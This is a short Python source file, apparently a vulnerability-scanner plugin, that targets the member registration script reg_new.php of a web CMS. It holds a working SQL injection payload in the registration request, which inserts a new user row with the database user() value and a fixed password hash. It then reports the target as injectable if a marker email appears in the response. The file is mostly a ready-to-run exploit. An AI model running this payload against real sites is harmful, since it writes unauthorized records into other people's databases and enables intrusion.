import requests
from termcolor import cprint

class reg_new_sqli:

    def __init__(self,url):
        self.url = url
    def checksql(self):
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "member/reg_new.php?dopost=regbase&step=1&mtype=%B8%F6%C8%CB&mtype=%B8%F6%C8%CB&userid=123asd123&uname=12asd13123&userpwd=123123&userpwdok=123123&email=1213asd123%40QQ.COM&safequestion=1','1111111111111','1389701121','127.0.0.1','1389701121','127.0.0.1'),('个人',user(),'4297f44b13955235245b2497399d7a93','12as11111111111111111d13123','','10','0','1213asd11111111111123@QQ.COM','100', '0','-10','','1&safeanswer=1111111111111&sex=&vdcode=slum&agree="
        if '://' not in self.url:
            self.url = 'http://' + self.url + '/'
        url = self.url
        vulnurl = url + payload
        try:
            r = requests.get(url=vulnurl,headers=headers)
            html = r.text
            if '1213asd11111111111123@QQ.COM' in html:
                cprint("target may be reg_new.php SqlInject","red")
        except:
            return False